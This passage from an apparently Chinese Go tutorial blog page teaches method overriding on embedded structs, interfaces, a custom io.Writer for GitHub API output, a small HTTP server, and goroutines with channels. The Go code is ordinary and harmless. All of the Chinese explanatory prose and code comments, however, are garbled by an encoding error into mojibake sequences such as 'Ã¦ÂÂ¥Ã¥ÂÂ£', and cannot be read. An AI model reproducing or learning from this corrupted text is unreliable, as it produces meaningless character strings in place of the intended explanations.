overloadã€€é‡è½½ä¸Šé¢çš„å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t coloredTriangle)</span> <span class="title">perimeter</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> t.size * <span class="number">3</span> * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s square)</span> <span class="title">perimeter</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> s.size * <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//æœ‰ç‚¹ç±»ä¼¼æ„é€ å‡½æ•°åˆå§‹åŒ–æ—¶ç›´æ¥èµ‹å€¼</span></span><br><span class="line">	t := triangle&#123;<span class="number">3</span>&#125;</span><br><span class="line">	t1 := coloredTriangle&#123;triangle&#123;<span class="number">3</span>&#125;, <span class="string">&quot;blue&quot;</span>&#125;</span><br><span class="line">	s := square&#123;<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter (triangle):&quot;</span>, t.perimeter())</span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter (triangle colored):&quot;</span>, t1.size, t1.perimeter())</span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter (normal)&quot;</span>, t1.triangle.perimeter())</span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter (square):&quot;</span>, s.perimeter())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">Perimeter (triangle): <span class="number">9</span></span><br><span class="line">Perimeter (triangle colored): <span class="number">3</span> <span class="number">18</span></span><br><span class="line">Perimeter (normal) <span class="number">9</span></span><br><span class="line">Perimeter (square): <span class="number">16</span></span><br></pre></td></tr></table></figure>





<h3 id="interface-oop"><a href="#interface-oop" class="headerlink" title="interface(oop)"></a>interface(oop)</h3><p>Go ä¸­çš„æ¥å£æ˜¯ä¸€ç§ç”¨äºè¡¨ç¤ºå…¶ä»–ç±»å‹çš„è¡Œä¸ºçš„æ•°æ®ç±»å‹ã€‚ æ¥å£ç±»ä¼¼äºå¯¹è±¡åº”æ»¡è¶³çš„è“å›¾æˆ–åå®šã€‚ åœ¨ä½ ä½¿ç”¨æ¥å£æ—¶ï¼Œä½ çš„åŸºæœ¬ä»£ç å°†å˜å¾—æ›´åŠ çµæ´»ã€é€‚åº”æ€§æ›´å¼ºï¼Œå› ä¸ºä½ ç¼–å†™çš„ä»£ç æœªç»‘å®šåˆ°ç‰¹å®šçš„å®ç°ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰æ¥å£</span></span><br><span class="line"><span class="keyword">type</span> Shape <span class="keyword">interface</span> &#123;</span><br><span class="line">	Perimeter() <span class="keyword">float64</span></span><br><span class="line">	Area() <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Square <span class="keyword">struct</span> &#123;</span><br><span class="line">	size <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Circle <span class="keyword">struct</span> &#123;</span><br><span class="line">	radius <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// â€œçŸ©å½¢â€çš„æ¥å£å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Square)</span> <span class="title">Area</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> s.size * s.size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Square)</span> <span class="title">Perimeter</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> s.size * <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// â€åœ†å½¢â€œçš„æ¥å£å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Circle)</span> <span class="title">Area</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> math.Pi * c.radius * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Circle)</span> <span class="title">Perimeter</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span> * math.Pi * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ã€€æ‰“å°ä¿¡æ¯</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printInformation</span><span class="params">(s Shape)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, s)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Area: &quot;</span>, s.Area())</span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter:&quot;</span>, s.Perimeter())</span><br><span class="line">	fmt.Println()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨æ¥å£çš„ä¼˜ç‚¹åœ¨äºï¼Œå¯¹äº Shapeçš„æ¯ä¸ªæ–°ç±»å‹æˆ–å®ç°ï¼ŒprintInformation å‡½æ•°éƒ½ä¸éœ€è¦æ›´æ”¹</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> s Shape = Square&#123;<span class="number">3</span>&#125;</span><br><span class="line">	printInformation(s)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> c Shape = Circle&#123;<span class="number">6</span>&#125;</span><br><span class="line">	printInformation(c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="æ‰©å±•ç°æœ‰å®ç°"><a href="#æ‰©å±•ç°æœ‰å®ç°" class="headerlink" title="æ‰©å±•ç°æœ‰å®ç°"></a>æ‰©å±•ç°æœ‰å®ç°</h4><p>å‡è®¾ä½ å…·æœ‰ä»¥ä¸‹ä»£ç ï¼Œå¹¶ä¸”å¸Œæœ›é€šè¿‡ç¼–å†™è´Ÿè´£å¤„ç†æŸäº›æ•°æ®çš„ <code>Writer</code> æ–¹æ³•çš„è‡ªå®šä¹‰å®ç°æ¥æ‰©å±•å…¶åŠŸèƒ½ã€‚</p>
<p>é€šè¿‡ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªç¨‹åºï¼Œæ­¤ç¨‹åºä½¿ç”¨ GitHub API ä» Microsoft è·å–ä¸‰ä¸ªå­˜å‚¨åº“ï¼š</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io.Copy(os.Stdout, resp.Body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå‰é¢çš„ä»£ç æ—¶ï¼Œä½ ä¼šæ”¶åˆ°ç±»ä¼¼äºä»¥ä¸‹è¾“å‡ºçš„å†…å®¹ï¼ˆå·²ç¼©çŸ­ä»¥ä¾¿æ”¹å–„å¯è¯»æ€§ï¼‰ï¼š</p>
<p>è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;id&quot;:276496384,&quot;node_id&quot;:&quot;MDEwOlJlcG9zaXRvcnkyNzY0OTYzODQ=&quot;,&quot;name&quot;:&quot;-Users-deepakdahiya-Desktop-juhibubash-test21zzzzzzzzzzz&quot;,&quot;full_name&quot;:&quot;microsoft/-Users-deepakdahiya-Desktop-juhibubash-test21zzzzzzzzzzz&quot;,&quot;private&quot;:false,&quot;owner&quot;:&#123;&quot;login&quot;:&quot;microsoft&quot;,&quot;id&quot;:6154722,&quot;node_id&quot;:&quot;MDEyOk9yZ2FuaXphdGlvbjYxNTQ3MjI=&quot;,&quot;avatar_url&quot;:&quot;https://avatars2.githubusercontent.com/u/6154722?v=4&quot;,&quot;gravatar_id&quot;:&quot;&quot;,&quot;url&quot;:&quot;https://api.github.com/users/microsoft&quot;,&quot;html_url&quot;:&quot;https://github.com/micro</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>è¯·æ³¨æ„ï¼Œ<code>io.Copy(os.Stdout, resp.Body)</code> è°ƒç”¨æ˜¯æŒ‡å°†é€šè¿‡å¯¹ GitHub API çš„è°ƒç”¨è·å–çš„å†…å®¹æ‰“å°åˆ°ç»ˆç«¯ã€‚ å‡è®¾ä½ æƒ³è¦å†™å…¥è‡ªå·±çš„å®ç°ä»¥ç¼©çŸ­ä½ åœ¨ç»ˆç«¯ä¸­çœ‹åˆ°çš„å†…å®¹ã€‚ åœ¨æŸ¥çœ‹ <a href="https://golang.org/pkg/io/#Copy"><code>io.Copy</code> å‡½æ•°çš„æº</a> æ—¶ï¼Œä½ å°†çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Copy</span><span class="params">(dst Writer, src Reader)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœä½ æ·±å…¥æŸ¥çœ‹ç¬¬ä¸€ä¸ªå‚æ•° <code>dst Writer</code> çš„è¯¦ç»†ä¿¡æ¯ï¼Œä½ ä¼šæ³¨æ„åˆ° <code>Writer</code> æ˜¯ <a href="https://golang.org/pkg/io/#Writer">æ¥å£</a>ï¼š</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Writer <span class="keyword">interface</span> &#123;</span><br><span class="line">    Write(p []<span class="keyword">byte</span>) (n <span class="keyword">int</span>, err error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½ å¯ä»¥ç»§ç»­æµè§ˆ <code>io</code> ç¨‹åºåŒ…çš„æºä»£ç ï¼Œç›´åˆ°æ‰¾åˆ° <a href="https://golang.org/src/io/io.go?s=12980:13040#L411?azure-portal=true"><code>Copy</code> è°ƒç”¨ <code>Write</code> æ–¹æ³•</a>çš„ä½ç½®ã€‚ æˆ‘ä»¬æš‚æ—¶ä¸åšä»»ä½•å¤„ç†ã€‚</p>
<p>ç”±äº <code>Writer</code> æ˜¯æ¥å£ï¼Œå¹¶ä¸”æ˜¯ <code>Copy</code> å‡½æ•°éœ€è¦çš„å¯¹è±¡ï¼Œä½ å¯ä»¥ç¼–å†™ <code>Write</code> æ–¹æ³•çš„è‡ªå®šä¹‰å®ç°ã€‚ å› æ­¤ï¼Œä½ å¯ä»¥è‡ªå®šä¹‰æ‰“å°åˆ°ç»ˆç«¯çš„å†…å®¹ã€‚</p>
<p>å®ç°æ¥å£æ‰€éœ€çš„ç¬¬ä¸€é¡¹æ“ä½œæ˜¯åˆ›å»ºè‡ªå®šä¹‰ç±»å‹ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªç©ºç»“æ„ï¼Œå› ä¸ºä½ åªéœ€æŒ‰å¦‚ä¸‹æ‰€ç¤ºç¼–å†™è‡ªå®šä¹‰ <code>Write</code> æ–¹æ³•å³å¯ï¼š</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> customWriter <span class="keyword">struct</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œä½ å·²å‡†å¤‡å°±ç»ªï¼Œå¯å¼€å§‹ç¼–å†™è‡ªå®šä¹‰ <code>Write</code> å‡½æ•°ã€‚ æ­¤æ—¶ï¼Œä½ è¿˜éœ€è¦ç¼–å†™ä¸€ä¸ªç»“æ„ï¼Œä»¥ä¾¿å°† JSON æ ¼å¼çš„ API å“åº”è§£æä¸º Golang å¯¹è±¡ã€‚ ä½ å¯ä»¥ä½¿ç”¨â€œJSON è½¬ Goâ€ç«™ç‚¹ä» JSON æœ‰æ•ˆè´Ÿè½½åˆ›å»ºç»“æ„ã€‚ å› æ­¤ï¼Œ<code>Write</code> æ–¹æ³•å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> GitHubResponse []<span class="keyword">struct</span> &#123;</span><br><span class="line">    FullName <span class="keyword">string</span> <span class="string">`json:&quot;full_name&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w customWriter)</span> <span class="title">Write</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> resp GitHubResponse</span><br><span class="line">    json.Unmarshal(p, &amp;resp)</span><br><span class="line">    <span class="keyword">for</span> _, r := <span class="keyword">range</span> resp &#123;</span><br><span class="line">        fmt.Println(r.FullName)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(p), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åï¼Œä½ å¿…é¡»ä¿®æ”¹ <code>main()</code> å‡½æ•°ä»¥ä½¿ç”¨ä½ çš„è‡ªå®šä¹‰å¯¹è±¡ï¼Œå…·ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    writer := customWriter&#123;&#125;</span><br><span class="line">    io.Copy(writer, resp.Body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿è¡Œç¨‹åºæ—¶ï¼Œä½ å°†ä¼šçœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼š</p>
<p>è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microsoft/aed-blockchain-learn-content</span><br><span class="line">microsoft/aed-content-nasa-su20</span><br><span class="line">microsoft/aed-external-learn-template</span><br><span class="line">microsoft/aed-go-learn-content</span><br><span class="line">microsoft/aed-learn-template</span><br></pre></td></tr></table></figure>

<p>ç”±äºä½ å†™å…¥çš„è‡ªå®šä¹‰ <code>Write</code> æ–¹æ³•ï¼Œè¾“å‡ºæ•ˆæœç°åœ¨æ›´å¥½ã€‚ ä»¥ä¸‹æ˜¯ç¨‹åºçš„æœ€ç»ˆç‰ˆæœ¬ï¼š</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> GitHubResponse []<span class="keyword">struct</span> &#123;</span><br><span class="line">    FullName <span class="keyword">string</span> <span class="string">`json:&quot;full_name&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> customWriter <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w customWriter)</span> <span class="title">Write</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> resp GitHubResponse</span><br><span class="line">    json.Unmarshal(p, &amp;resp)</span><br><span class="line">    <span class="keyword">for</span> _, r := <span class="keyword">range</span> resp &#123;</span><br><span class="line">        fmt.Println(r.FullName)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(p), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    writer := customWriter&#123;&#125;</span><br><span class="line">    io.Copy(writer, resp.Body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="web-api"><a href="#web-api" class="headerlink" title="web api"></a>web api</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> dollars <span class="keyword">float32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d dollars)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;$%.2f&quot;</span>, d)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> database <span class="keyword">map</span>[<span class="keyword">string</span>]dollars</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db database)</span> <span class="title">ServeHTTP</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> item, price := <span class="keyword">range</span> db &#123;</span><br><span class="line">        fmt.Fprintf(w, <span class="string">&quot;%s: %s\n&quot;</span>, item, price)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    db := database&#123;<span class="string">&quot;Go T-Shirt&quot;</span>: <span class="number">25</span>, <span class="string">&quot;Go Jacket&quot;</span>: <span class="number">55</span>&#125;</span><br><span class="line">    log.Fatal(http.ListenAndServe(<span class="string">&quot;localhost:8000&quot;</span>, db))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è®¿é—®ç½‘ç«™ä¼šå‡ºç°</span></span><br><span class="line">Go Jacket: $<span class="number">55.00</span></span><br><span class="line">Go T-Shirt: $<span class="number">25.00</span></span><br></pre></td></tr></table></figure>







<h3 id="å¹¶å‘"><a href="#å¹¶å‘" class="headerlink" title="å¹¶å‘"></a>å¹¶å‘</h3><h4 id="æ— ç¼“å†²channel"><a href="#æ— ç¼“å†²channel" class="headerlink" title="æ— ç¼“å†²channel"></a>æ— ç¼“å†²channel</h4><p> æ— ç¼“å†² channel åŒæ­¥é€šä¿¡ã€‚ å®ƒä»¬ä¿è¯æ¯æ¬¡å‘é€æ•°æ®æ—¶ï¼Œç¨‹åºéƒ½ä¼šè¢«é˜»æ­¢ï¼Œç›´åˆ°æœ‰äººä» channel ä¸­è¯»å–æ•°æ®ã€‚</p>
<p>æ— ç¼“å†²åŒ¿åå‡½æ•°å®ç°å¹¶å‘æ‰“å°1-10</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(n <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">		 		ch &lt;- n</span><br><span class="line">		 		<span class="keyword">return</span></span><br><span class="line">	 	&#125;(i)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">10</span>; j++ &#123;</span><br><span class="line">		fmt.Print(&lt;-ch)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æ— ç¼“å†²éåŒ¿åå‡½æ•°å®ç°å¹¶å‘æ‰“å°1-10</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> run_10(i, ch)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">10</span>; j++ &#123;</span><br><span class="line">		fmt.Print(&lt;-ch)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run_10</span><span class="params">(n <span class="keyword">int</span>, ch <span class="keyword">chan</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	ch &lt;- n</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	start := time.Now()</span><br><span class="line"></span><br><span class="line">	apis := []<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;https://management.azure.com&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://dev.azure.com&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://api.github.com&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://outlook.office.com/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://api.somewhereintheinternet.com/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://graph.microsoft.com&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// åˆ›å»ºä¸€ä¸ªchannelç”¨äºä¼ é€’å¹¶å‘ä¹‹é—´çš„æ¶ˆæ¯</span></span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, api := <span class="keyword">range</span> apis &#123;</span><br><span class="line">		<span class="comment">//è®©checkAPIå¹¶å‘è¿è¡Œ,å‘é€channel</span></span><br><span class="line">		<span class="keyword">go</span> checkAPI(api, ch)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// channelè¿”å›äº†apisæ•°é‡çš„æ¶ˆæ¯ï¼Œéœ€è¦å…¨éƒ¨æ¥æ”¶ä¸‹æ¥</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(apis); i++ &#123;</span><br><span class="line">        <span class="comment">//æ¥æ”¶channel</span></span><br><span class="line">		fmt.Print(&lt;-ch)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	elapsed := time.Since(start)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Done! It took %v seconds!\n&quot;</span>, elapsed.Seconds())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkAPI</span><span class="params">(api <span class="keyword">string</span>, ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	_, err := http.Get(api)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="comment">// å‘channelè¿”å›æ¶ˆæ¯,ç›¸å½“äºè¿”å›å€¼é€šè¿‡channelä¼ é€å›å»äº†</span></span><br><span class="line">		ch &lt;- fmt.Sprintf(<span class="string">&quot;ERROR: %s is down!\n&quot;</span>, api)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ch &lt;- fmt.Sprintf(<span class="string">&quot;SUCCESS: %s is up and running!\n&quot;</span>, api)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="æœ‰ç¼“å†²-channel"><a href="#æœ‰ç¼“å†²-channel" class="headerlink" title="æœ‰ç¼“å†² channel"></a>æœ‰ç¼“å†² channel</h4><p>å°†å‘é€å’Œæ¥æ”¶æ“ä½œè§£è€¦ã€‚ å®ƒä»¬ä¸ä¼šé˜»æ­¢ç¨‹åºï¼Œä½†ä½ å¿…é¡»å°å¿ƒä½¿ç”¨ï¼Œå› ä¸ºå¯èƒ½æœ€ç»ˆä¼šå¯¼è‡´æ­»é”</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    size := <span class="number">2</span></span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, size)</span><br><span class="line">    send(ch, <span class="string">&quot;one&quot;</span>)</span><br><span class="line">    send(ch, <span class="string">&quot;two&quot;</span>)</span><br><span class="line">    <span class="comment">//å¦‚æœæ²¡æœ‰goä¼šå¯¼è‡´æ­»é”ï¼Œåˆ›å»ºgoroutineï¼ˆä½¿ç”¨goå…³é”®å­—ï¼‰å°±ä¸ä¼šäº§ç”Ÿè¿™ä¸ªé—®é¢˜</span></span><br><span class="line">    <span class="keyword">go</span> send(ch, <span class="string">&quot;three&quot;</span>)</span><br><span class="line">    <span class="keyword">go</span> send(ch, <span class="string">&quot;four&quot;</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;All data sent to the channel ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123;</span><br><span class="line">        fmt.Println(&lt;-ch)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="channelæ–¹å‘"><a href="#channelæ–¹å‘" class="headerlink" title="channelæ–¹å‘"></a>channelæ–¹å‘</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">chan</span>&lt;- <span class="keyword">int</span> <span class="comment">// it&#x27;s a channel to only send data</span></span><br><span class="line">&lt;-<span class="keyword">chan</span> <span class="keyword">int</span> <span class="comment">// it&#x27;s a channel to only receive data</span></span><br></pre></td></tr></table></figure>

<p>example</p>
